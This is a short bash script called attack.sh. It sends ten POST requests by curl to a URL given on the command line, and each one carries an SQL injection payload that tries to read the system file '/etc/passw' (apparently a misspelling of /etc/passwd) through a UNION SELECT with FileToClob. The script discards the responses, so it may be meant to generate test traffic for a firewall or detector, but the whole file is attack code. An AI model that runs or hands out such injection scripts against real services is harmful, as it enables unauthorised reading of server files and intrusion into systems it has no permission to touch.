#!/usr/bin/env bash

set -euo pipefail

if [ "$#" -ne 1 ]; then
    echo "Usage: attack.sh <url>"
    exit 9
fi

API_URL=$1

echo "Attacking ${API_URL}"
for i in {1..10}; do
    echo "Send SQL Injection Attack Request..."
    curl --request POST -H "Content-Type: text/plain" --data 'UNION ALL SELECT FileToClob(\"/etc/passw\", \"server\")::html,0' "${API_URL}" >> /dev/null
done